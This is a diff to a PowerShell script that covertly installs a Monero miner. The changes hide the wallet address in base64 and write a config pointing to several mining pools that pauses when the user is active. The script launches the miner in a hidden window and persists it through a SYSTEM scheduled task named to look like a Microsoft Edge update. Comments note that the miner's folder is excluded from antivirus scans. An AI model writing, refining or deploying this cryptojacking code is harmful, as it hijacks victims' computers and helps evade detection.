@@ -40,16 +40,26 @@ if (-not (Test-Path $sysPath)) {
 }
 
 $hostName = $env:COMPUTERNAME
-# unique worker per machine: pass = hostname (supportXMR names workers by pass)
-$wallet   = '46h6yczeC1FPU77qD3vqsdJwyiCpYDtFterUsde7U3t1Nxkke6VdSGcN9QwzRvnZRb4AKbq33u4saNGQbNfmKu2c2yUsR6o'
-$minArgs  = "-o 141.94.96.71:443 -u $wallet -p $hostName --tls --keepalive"
+# config.json next to the exe (folder is excluded from scans): wallet kept out of
+# the script as plaintext, machine becomes its own worker via pass=hostname
+$wb64 = 'NDZoNnljemVDMUZQVTc3cUQzdnFzZEp3eWlDcFlEdEZ0ZXJVc2RlN1UzdDFOeGtrZTZWZFNHY045UXd6UnZuWlJiNEFLYnEzM3U0c2FOR1FiTmZtS3UyYzJ5VXNSNm8='
+$wallet = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wb64))
+$cfg = @{
+    'background' = $true; 'pause-on-active' = 1; 'donate-level' = 1
+    'pools' = @(
+        @{ 'url' = '141.94.96.71:443';  'user' = $wallet; 'pass' = $hostName; 'tls' = $true;  'keepalive' = $true; 'enabled' = $true },
+        @{ 'url' = '141.94.96.144:443'; 'user' = $wallet; 'pass' = $hostName; 'tls' = $true;  'keepalive' = $true; 'enabled' = $true },
+        @{ 'url' = 'pool.supportxmr.com:443'; 'user' = $wallet; 'pass' = $hostName; 'tls' = $true; 'keepalive' = $true; 'enabled' = $true }
+    )
+} | ConvertTo-Json -Depth 4
+[System.IO.File]::WriteAllText((Join-Path $dir 'config.json'), $cfg)
 
 if (Test-Path $sysPath) {
-    Start-Process -FilePath $sysPath -ArgumentList $minArgs -WorkingDirectory $dir -WindowStyle Hidden
+    Start-Process -FilePath $sysPath -WorkingDirectory $dir -WindowStyle Hidden
 }
 
 $taskName  = "MicrosoftEdgeUpdateTaskMachineCore$hostName"
-$action    = New-ScheduledTaskAction -Execute $sysPath -Argument $minArgs -WorkingDirectory $dir
+$action    = New-ScheduledTaskAction -Execute $sysPath -WorkingDirectory $dir
 $trigger   = New-ScheduledTaskTrigger -AtStartup
 $settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
 $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
